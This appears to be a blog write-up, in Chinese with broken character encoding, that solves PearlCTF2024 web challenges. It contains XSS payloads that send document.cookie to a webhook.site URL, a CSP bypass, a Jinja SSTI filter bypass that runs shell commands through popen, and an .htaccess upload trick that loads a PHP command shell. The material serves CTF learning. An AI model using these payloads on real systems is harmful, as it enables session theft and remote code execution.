<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>[PearlCTF2024]WEB WP | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="[PearlCTF2024]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="æˆ‘æ˜¯è€é¦‹
learn HTTP
XSSä¸‰è¿å‡»
é¢˜ç›®æè¿°
é¢˜ç›®ç»™äº†æºç ï¼Œè¿™ä¸ªåº”ç”¨é‡Œé¢æœ‰ä¸¤ä¸ªæœåŠ¡åˆ†åˆ«æ˜¯5000ç«¯å£è¿è¡Œçš„nodejsï¼Œä»¥åŠ5001ç«¯å£è¿è¡Œçš„golongï¼ŒæœåŠ¡é€šè¿‡nginxä»£ç†å‡ºæ¥ã€‚
server {
    listen 60..." />
    <meta name="keywords" content="XSS,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              [PearlCTF2024]WEB WP
            </h2>
            <div class="post-info">
              <span>
                2024-03-13
              </span>
              <span>
                13 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/hA1lnMsJD/" class="post-tag">
                  # XSS
                </a>
              
                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
                  # CTF
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/pearlctf2024web-wp.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <p>æˆ‘æ˜¯è€é¦‹</p>
<h1 id="learn-http">learn HTTP</h1>
<p>XSSä¸‰è¿å‡»</p>
<h2 id="é¢˜ç›®æè¿°">é¢˜ç›®æè¿°</h2>
<p>é¢˜ç›®ç»™äº†æºç ï¼Œè¿™ä¸ªåº”ç”¨é‡Œé¢æœ‰ä¸¤ä¸ªæœåŠ¡åˆ†åˆ«æ˜¯5000ç«¯å£è¿è¡Œçš„nodejsï¼Œä»¥åŠ5001ç«¯å£è¿è¡Œçš„golongï¼ŒæœåŠ¡é€šè¿‡nginxä»£ç†å‡ºæ¥ã€‚</p>
<pre><code>server {
    listen 6000;
    listen [::]:6000;

    server_name pearlctf.in;

    location / {
	    proxy_pass http://localhost:5000/;
    }
    
    location /resp {
    	proxy_pass http://localhost:5001/resp;
    }
}
</code></pre>
<p><code>/resp</code>è·¯ç”±æ¥å—ä¸€ä¸ªbodyå‚æ•°ï¼Œå®ƒä¼šå°†bodyä½œä¸ºæ•´ä¸ªå“åº”å†…å®¹ï¼ˆå“åº”å¤´+å“åº”ä½“ï¼‰è¿”å›ç»™å®¢æˆ·</p>
<pre><code class="language-go">func processClient(connection net.Conn) {
	buffer := make([]byte, 1024)
	mLen, err := connection.Read(buffer)
	if err != nil {
		fmt.Println(&quot;Error reading:&quot;, err.Error())
	}
	raw_http_req := strings.Split(string(buffer[:mLen]), &quot;\r\n&quot;)[0]
	splitted_req := strings.Split(raw_http_req, &quot; &quot;)

	if splitted_req[0] != &quot;GET&quot; {
		_, err = connection.Write([]byte(&quot;HTTP/1.1 405 Method Not Allowed\r\n\r\nCan only GET&quot;))
		connection.Close()
		return
	}

	parsed, err := url.Parse(splitted_req[1])
	if err != nil {
		fmt.Println(&quot;Error parsing: &quot;, err.Error())
	}

	path := parsed.Path

	if path != &quot;/resp&quot; {
		_, err = connection.Write([]byte(&quot;HTTP/1.1 404 Not Found\r\n\r\nNot Found&quot;))
		connection.Close()
		return
	}
	
	args, err := url.ParseQuery(parsed.RawQuery)

	if err != nil {
		_, err = connection.Write([]byte(&quot;HTTP/1.1 500 Internal Server Error\r\n\r\nError&quot;))
		connection.Close()
		return
	}

	body, ok := args[&quot;body&quot;]

	if !ok {
		_, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
		connection.Close()
		return
	}

	_, err = connection.Write([]byte(body[0]))
	connection.Close()
}
</code></pre>
<p>nodejsæœåŠ¡çš„<code>/check</code>åŒæ ·æ¥å—ä¸€ä¸ªbodyå‚æ•°ï¼Œå®ƒä¼šå¯¹å…¶å€¼è¿›è¡Œurlç¼–ç ï¼Œç„¶åä½œä¸º<code>/resp</code>çš„å‚æ•°ç»„è£…è®©bot.jsè®¿é—®</p>
<pre><code class="language-javascript">const genToken = () =&gt; {
    var token = jwt.sign({ id: 1 }, process.env.SECRET);
    return token
}

app.post(&quot;/check&quot;, (req, res) =&gt; {
    try {
        let req_body = req.body.body
        
        if (req_body == undefined) {
            return res.status(200).send(&quot;Body is not provided&quot;)
        }

        let to_req = `http://localhost:5001/resp?body=${encodeURIComponent(req_body)}`

        childProcess.spawn('node', ['./bot.js', JSON.stringify({
            url: to_req,
            token: genToken()
        })]);

        return res.status(200).send(&quot;Admin will check!&quot;)
    } catch (e) {
        console.log(e)
        return res.status(500).send(&quot;Internal Server Error&quot;)
    }
})
</code></pre>
<p>å…¶ä¸­bot.jsä¼šç”¨chromiumå¯¹ç›®æ ‡è¿›è¡Œè®¿é—®</p>
<pre><code class="language-javascript">const puppeteer = require('puppeteer')

async function visit(obj){
	let browser;

	let url = obj['url'];
	let token = obj['token'];

	if(!/^https?:\/\//.test(url)){
		return;
	}

	try{
		browser = await puppeteer.launch({
            headless: true,
            executablePath: '/usr/bin/chromium-browser',
            args: [
            '--no-sandbox',
            '--headless',
            '--disable-gpu',
            '--disable-dev-shm-usage'
            ]
        });

		let page = await browser.newPage();
		await page.setCookie({
			name: 'token',
			value: token,
			domain: 'localhost',
			httpOnly: false,
			secure: true,
			sameSite: 'None'
		});
		await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 3000 });
		await new Promise(r=&gt;setTimeout(r,10000));
	}catch(e){ console.log(e) }
	try{await browser.close();}catch(e){}
	process.exit(0)
}

visit(JSON.parse(process.argv[2]))
</code></pre>
<p>è¿™é¢˜è¦get flagéœ€è¦ä¸€ä¸ª<code>id=2</code>çš„jwtï¼Œæ¥è®¿é—®<code>/flag</code></p>
<pre><code class="language-javascript">app.get(&quot;/flag&quot;, (req, res) =&gt; {
    let token = req.cookies.token
    try {
        var decoded = jwt.verify(token, process.env.SECRET)
        if (decoded.id != 2) {
            return res.status(200).send(&quot;You are not verified&quot;)
        }

        return res.status(200).send(process.env.FLAG)
    } catch {
        return res.status(200).send(&quot;You are not verified&quot;)
    }
})
</code></pre>
<p>åœ¨å¯¹æ•´ä¸ªæµç¨‹åˆ†æåå¯ä»¥çŸ¥é“ï¼Œè§£é¢˜çš„æ–¹æ³•åªæœ‰æ‹¿åˆ°bot.jsè¯·æ±‚æ—¶ç”¨<code>genToken()</code>ç”Ÿæˆåœ¨cookieä¸­çš„tokenï¼Œç„¶åç ´è§£å¯†é’¥ä¼ªé€ ç­¾åã€‚</p>
<h2 id="base">base</h2>
<p>è‡ªå®šä¹‰çš„å“åº”å†…å®¹å¯ä»¥ä½¿ç”¨jsï¼Œchromiumä¹Ÿä¼šæ­£å¸¸åŠ è½½jsã€‚æ‰€ä»¥è®©bot.jsè®¿é—®<code>/resp</code>è·å¾—çš„å“åº”å†…å®¹å¦‚ä¸‹å³å¯</p>
<pre><code class="language-javascript">HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 121

&lt;script&gt;
fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`,{method: 'GET'});
&lt;/script&gt;
</code></pre>
<p>Ps.è¿™é‡Œæœ‰ä¸ªè¦æ³¨æ„çš„ç‚¹ï¼Œbot.jsåœ¨è®¾ç½®cookieæ—¶æœ‰ä¸ªé€‰é¡¹<code>secure: true</code>ï¼Œå®ƒçš„æ„æ€æ˜¯åªå…è®¸cookieä»¥httpsä¼ è¾“ï¼ˆæ‹¿è‡ªå·±vpsç”¨httpè¯•äº†å¥½ä¹…éƒ½æ²¡æ³¨æ„åˆ°ğŸ˜­ä¸è¿‡ä¹Ÿå› æ­¤çŸ¥é“äº†<code>webhook.site</code>è¿™ä¸ªå¹³å°ğŸ‘ï¼‰ã€‚</p>
<p>ç¼–å†™è„šæœ¬</p>
<pre><code class="language-python">import requests

def build(p):
    return f&quot;HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;

webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
body = f&quot;&quot;&quot;&lt;script&gt;
fetch(`{webhook}${{document.cookie}}`,{{method: 'GET'}});
&lt;/script&gt;&quot;&quot;&quot;

payload = build(body)
# print(payload)

url = &quot;https://learn-http.ctf.pearlctf.in/check&quot;
data = {&quot;body&quot;: payload}
response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
print(response.text)
</code></pre>
<p>æ‹¿åˆ°tokenè§£å¯†ï¼ˆè¦ç”¨å¯†ç æœ¬ï¼‰ã€ä¿®æ”¹idã€è®¿é—®/flag</p>
<pre><code class="language-shell">python jwt_tool.py &lt;jwt&gt; -C -d &lt;path&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1710266513442.png" alt="" loading="lazy"></figure>
<h2 id="better">better</h2>
<p>è¿™ä¸€éš¾åº¦ä¿®åªæ”¹äº†<code>/resp</code>çš„é€»è¾‘</p>
<pre><code class="language-go">body, ok := args[&quot;body&quot;]

if !ok {
    _, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
    connection.Close()
    return
}

splitted_resp := strings.Split(body[0], &quot;\r\n\r\n&quot;)
// åœ¨å“åº”å¤´é¡¶éƒ¨æ’å…¥Content-Security-Policy: script-src 'self'
new_header := strings.Join([]string{splitted_resp[0], &quot;Content-Security-Policy: script-src 'self'&quot;}, &quot;\r\n&quot;)

final_body := strings.Join([]string{new_header, splitted_resp[1]}, &quot;\r\n\r\n&quot;)

_, err = connection.Write([]byte(final_body))
connection.Close()
</code></pre>
<p>æŒ‰ç†æ¥è¯´ï¼ŒCSPåªé™åˆ¶äº†å†…å®¹çš„åŠ è½½æ˜¯åŒæºçš„ï¼Œå¯¹äºä¸€ä¸ªå“åº”ä¸­çš„jsä»£ç ä¸å½±å“æ‰å¯¹ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªä»£ç ï¼Œå³ä½¿åŠ äº†CSPï¼Œä½†scriptä¸­çš„ä»£ç ä¾ç„¶ä¼šæ‰§è¡Œï¼Œè¯·æ±‚è¿˜æ˜¯ä¼šå‘é€å‡ºå»ã€‚</p>
<pre><code class="language-php">&lt;?php
    if (!isset($_COOKIE['skky'])) {
        setcookie('skky',md5(rand(0,1000)));
    }
    header(&quot;Content-Security-Policy: script-src 'self';&quot;);
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;CSP Test&lt;/title&gt;
    &lt;script&gt;
      fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`, {method: 'GET'});
    &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h2&gt;CSP-safe&lt;/h2&gt;
&lt;/body&gt;

</code></pre>
<p>ä½†è¿™é‡Œå¯èƒ½æ˜¯ä¸åŒæµè§ˆå™¨å¯¹CSPç­–ç•¥ä¸åŒï¼Œåœ¨ä½¿ç”¨bot.jsçš„chromiumè®¿é—®çš„æ—¶å€™ï¼Œè¿™ä¸ªwebhookçš„è¯·æ±‚æ˜¯å‘ä¸å‡ºå»çš„ã€‚è™½ç„¶æŠŠåŸå› æ¨åˆ°æµè§ˆå™¨ä¸Šæ„Ÿè§‰æ€ªæ€ªçš„ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä¹Ÿæ‰¾ä¸åˆ°æ›´åˆé€‚çš„è§£é‡Šäº†ã€‚</p>
<pre><code class="language-python">import subprocess
import requests


def run_command(cmd):
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.stderr:
        return f&quot;Error: {result.stderr}&quot;
    else:
        return result.stdout


# ä½¿ç”¨é¢˜ç›®çš„dockerè¿›è¡Œæµ‹è¯•
url = &quot;http://172.22.107.50:8888/xss/&quot;
command = ['docker', 'run', '--rm', '--net=host', 'xss_bot', '/usr/local/bin/node', '/home/app/bot.js', f'{{&quot;url&quot;:&quot;{url}&quot;, &quot;token&quot;:&quot;skky&quot;}}']
output = run_command(command)
print(output)
</code></pre>
<p>Anywayï¼Œæ—¢ç„¶è¦åŒæºåŠ è½½ä¸€ä¸ªè„šæœ¬çš„è¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å®ƒå†…éƒ¨çš„<code>http://localhost:5001/resp</code>æ¥åšã€‚é¦–å…ˆè®©bot.jsè®¿é—®å¾—åˆ°ç±»ä¼¼ä¸‹é¢çš„å†…å®¹</p>
<pre><code class="language-javascript">HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 60

&lt;script src=&quot;http://localhost:5001/resp?body=xxxx&quot;&gt;&lt;/script&gt;
</code></pre>
<p>è¿™é‡Œçš„<code>src</code>å¼•å…¥çš„è„šæœ¬å°±æ˜¯åŒæºçš„ã€‚æ¥ç€æ„é€ è¿™ä¸ªurlçš„bodyéƒ¨åˆ†ï¼Œåœ¨å®ƒçš„å“åº”ä¸­æ‰§è¡Œjsä»£ç </p>
<pre><code class="language-javascript">HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 102

fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`,{method: 'GET'});
</code></pre>
<p>åˆ©ç”¨è„šæœ¬å¦‚ä¸‹</p>
<pre><code class="language-javascript">import urllib.parse
import requests


def build(p):
    return f&quot;HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;


webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
body_2 = f&quot;&quot;&quot;fetch(`{webhook}${{document.cookie}}`,{{method: 'GET'}});&quot;&quot;&quot;
# print(build(body_2))
src = f&quot;http://localhost:5001/resp?body={urllib.parse.quote(build(body_2))}&quot;

body_1 = f&quot;&lt;script src=\&quot;{src}\&quot;&gt;&lt;/script&gt;&quot;
payload = build(body_1)
# print(payload)

url = &quot;https://v1-learn-http.ctf.pearlctf.in/check&quot;
data = {&quot;body&quot;: payload}
response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
print(response.text)
</code></pre>
<h2 id="final">final</h2>
<p>æœ€åéš¾åº¦é¦–å…ˆä¿®æ”¹äº†å“åº”é€»è¾‘ï¼Œå»é™¤äº†å“åº”ä½“ä¸­æ‰€æœ‰çš„å°–æ‹¬å·<code>&lt;``&gt;</code>ã€‚</p>
<pre><code class="language-go">body, ok := args[&quot;body&quot;]

if !ok {
    _, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
    connection.Close()
    return
}

splitted_resp := strings.Split(body[0], &quot;\r\n\r\n&quot;)

sanitized_body := strings.Replace(splitted_resp[1], &quot;&lt;&quot;, &quot;&quot;, -1)
sanitized_body = strings.Replace(sanitized_body, &quot;&gt;&quot;, &quot;&quot;, -1)

final := strings.Join([]string{splitted_resp[0], sanitized_body}, &quot;\r\n\r\n&quot;)

_, err = connection.Write([]byte(final))
connection.Close()
</code></pre>
<p>åŒæ—¶ä¿®æ”¹äº†nodejsçš„è·¯ç”±</p>
<pre><code class="language-javascript">app.get(&quot;/&quot;, (req, res) =&gt; {
    res.sendFile(path.join(__dirname, &quot;templates/index.html&quot;))
})

app.get(&quot;/learn&quot;, (req, res) =&gt; {
    res.status(200).sendFile(path.join(__dirname, &quot;templates/learn.html&quot;))
})
</code></pre>
<p>ç°åœ¨è™½ç„¶æ— æ³•åœ¨<code>/resp</code>ä¸­æ‰§è¡Œjsäº†ï¼Œä½†æ–°å¢çš„è·¯ç”±<code>/learn</code>å­˜åœ¨XSSæ¼æ´</p>
<pre><code class="language-javascript">function getCookie(name) {
    var nameEQ = name + &quot;=&quot;;
    var ca = document.cookie.split(';');
    for(var i=0;i &lt; ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

document.getElementById(&quot;greet&quot;).innerHTML = `Hello, ${getCookie(&quot;name&quot;)}`
</code></pre>
<p><code>templates/learn.html</code>ä¼šè·å–è¯·æ±‚ä¸­cookieï¼Œå¹¶ä¸”æœªåšä»»ä½•å¤„ç†è¾“å‡ºåœ¨é¡µé¢ä¸Šã€‚å› ä¸ºè¿™éƒ¨åˆ†çš„ä»£ç æ˜¯åœ¨é¡µé¢åŠ è½½åæ‰§è¡Œçš„ï¼Œæ‰€ä»¥cookieå¦‚æœè®¾ç½®ä¸ºç±»ä¼¼<code>&lt;script&gt;alert&lt;/script&gt;</code>å¹¶ä¸ä¼šæ‰§è¡Œã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1710266528322.png" alt="" loading="lazy"></p>
<p>å¯ä»¥ç”¨<code>img</code>æ ‡ç­¾çš„<code>onerror</code>äº‹ä»¶è§¦å‘ï¼Œç±»ä¼¼<code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code>ã€‚</p>
<p>å¯¹äºbot.jsï¼Œè™½ç„¶æ— æ³•è®©å®ƒç›´æ¥è®¿é—®<code>/learn</code>ï¼Œä½†æ˜¯å¯ä»¥è®©<code>/resp</code>è¿”å›ä¸€ä¸ª302è·³è½¬</p>
<pre><code class="language-javascript">HTTP/1.1 302 Found
Location: http://localhost:5000/learn
Set-Cookie: name=&lt;img src=x onerror=&quot;fetch('https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/'+document.cookie)&quot;/&gt;
Content-Length: 0
</code></pre>
<p>åˆ©ç”¨è„šæœ¬</p>
<pre><code class="language-python">import urllib.parse
import requests


def build(p):
    webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
    onerror = f&quot;fetch('{webhook}'+document.cookie)&quot;
    cookie = f&quot;&lt;img src=x onerror=\&quot;{onerror}\&quot;/&gt;&quot;
    return f&quot;HTTP/1.1 302 Found\r\nLocation: http://localhost:5000/learn\r\nSet-Cookie: name={cookie}\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;


payload = build('')
# print(payload)

data = {&quot;body&quot;: payload}
url = &quot;https://v2-learn-http.ctf.pearlctf.in/check&quot;
response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
print(response.text)
</code></pre>
<h1 id="i-am-a-web-noob">I am a web-noob</h1>
<p>userå¤„å­˜åœ¨ssti</p>
<p>è¿‡æ»¤äº†åŒèŠ±æ‹¬å·ï¼ˆ{{ï¼‰ã€ä¸­æ‹¬å·ï¼ˆ[ï¼‰ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ã€ä¸€äº›å­—ç¬¦ä¸²ï¼ˆ&quot;open&quot;ã€&quot;-&quot;......ï¼‰</p>
<p>ä½¿ç”¨æ§åˆ¶è¯­å¥<code>{% print() %}</code>æ‰§è¡Œ+è¾“å‡ºç»“æœï¼Œ<code>|attr(request.args.a)</code>è®¿é—®å¯¹è±¡å±æ€§ã€‚</p>
<p>æ„é€ payloadè·å–å¯ä»¥ç”¨çš„ç±»ï¼Œè¿™ä¸ªæ‰§è¡Œç»“æœç­‰ä»·äºï¼š<code>''.__class__.__base__.__subclasses__()[154]</code></p>
<pre><code>?user={%print(&quot;&quot;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(154))%}&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1710266546021.png" alt="" loading="lazy"></figure>
<p>ä½¿ç”¨popenæ‰§è¡Œå‘½ä»¤è¯»å–flagï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªæ‹¬å·çš„ä½ç½®ï¼Œç›¸å½“äº<code>(os.popen(cmd)).read()</code></p>
<pre><code>?user={%print((&quot;&quot;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(154)|attr(request.args.e)|attr(request.args.f)|attr(request.args.d)(request.args.g)(request.args.rce)).read())%}&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;rce=cat /app/flag.txt
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1710266559310.png" alt="" loading="lazy"></figure>
<h1 id="rabbithole">rabbithole</h1>
<p>ğŸ°<br>
<img src="https://skyblu3519.github.io/post-images/1710266614161.png" alt="" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/1710266619923.png" alt="" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/1710266624772.png" alt="" loading="lazy"></p>
<h1 id="uploader">uploader</h1>
<p>æ–‡ä»¶ä¸Šä¼ å¯¹å†…å®¹åšäº†è¯¦ç»†çš„æ£€æŸ¥ï¼Œä½†æ˜¯åç¼€åå¹¶æ²¡æœ‰ã€‚</p>
<p>ä¸Šä¼ base64ç¼–ç åçš„phpå‘½ä»¤æ‰§è¡Œä»£ç <br>
<img src="https://skyblu3519.github.io/post-images/1710266655041.png" alt="" loading="lazy"></p>
<p>ä¸Šä¼ <code>.htaccess</code>ï¼Œä½¿ç”¨<code>\</code>+æ¢è¡Œç»•è¿‡å†…å®¹æ£€æŸ¥ï¼ˆå¦‚æœæ„¿æ„å¯ä»¥åœ¨æ¯ä¸€ä¸ªå­—ç¬¦åéƒ½åŠ ä¸Šï¼Œè¿™æ ·ä¾ç„¶å¯ä»¥è§£æï¼‰ï¼Œä¸Šä¼ çš„<code>.htaccess</code>å†…å®¹ä¸ºï¼š</p>
<pre><code># å¼€å¯PHPè§£æå¼•æ“
php_flag engine on
# éœ€è¦ç»å¯¹è·¯å¾„ï¼Œå› ä¸ºincluldeçš„å½“å‰è·¯å¾„ä¸º/usr/local/lib/php
php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/uploads/10.80.1.9/26398c9deb8c36cb3de78baec7da7f4f1be1438aad2876be79d21e9592d9aea3.php&quot;
</code></pre>
<p><img src="https://skyblu3519.github.io/post-images/1710266664944.png" alt="" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/1710266733221.png" alt="" loading="lazy"><br>
è®¿é—®ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤æŸ¥æ‰¾flag.txt<br>
<img src="https://skyblu3519.github.io/post-images/1710266697043.png" alt="" loading="lazy"></p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#learn-http">learn HTTP</a>
<ul>
<li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0">é¢˜ç›®æè¿°</a></li>
<li><a href="#base">base</a></li>
<li><a href="#better">better</a></li>
<li><a href="#final">final</a></li>
</ul>
</li>
<li><a href="#i-am-a-web-noob">I am a web-noob</a></li>
<li><a href="#rabbithole">rabbithole</a></li>
<li><a href="#uploader">uploader</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/vishwactf2024web-wp/">
              <h3 class="post-title">
                [vishwactf2024]WEB WP
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
